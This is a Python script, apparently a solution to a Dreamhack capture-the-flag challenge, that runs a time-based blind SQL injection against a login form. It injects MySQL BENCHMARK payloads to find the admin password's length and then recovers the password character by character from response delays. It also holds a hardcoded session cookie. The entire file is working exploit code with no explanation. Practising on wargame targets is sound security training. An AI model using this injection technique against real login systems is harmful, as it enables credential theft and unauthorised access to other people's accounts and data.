import requests
from tqdm import tqdm
import time

url = 'http://host3.dreamhack.games:21941/login'
cookies = {'session': 'eyJpZCI6eyIgYiI6ImoyZzNBVk1TUEZjdm1oRHMvMVRyTVE9PSJ9LCJ0cmllcyI6MH0.Y6MlRA.9b-uGdhOqlTcQI5yBFduRA1Dp04'}
pw = ''
password_length = 0
for i in tqdm(range(1, 100)):
    payload = f"' or username='admin' and if(length(password)={i}, BENCHMARK(15000000, md5('a')),0)-- -"
    params = {'username': 'admin',
              'password': payload}

    start = time.time()
    r = requests.post(url, data=params, cookies=cookies)
    end = time.time()
    if end - start > 2:
        print(f"password length : {i}")
        password_length = i
        break

for i in tqdm(range(1, password_length+1)):
    for j in range(33, 127):
        payload = f"' or username='admin' and if(ord(substr(password,{i},1))={j}, BENCHMARK(15000000, md5('a')),0)-- -"
        params = {'username': 'admin',
                  'password': payload}

        start = time.time()
        r = requests.post(url, data=params, cookies=cookies)
        end = time.time()
        if end - start > 2:
            pw += chr(j)
            print(f"find password : {pw}")
            break


# BENCHMARK
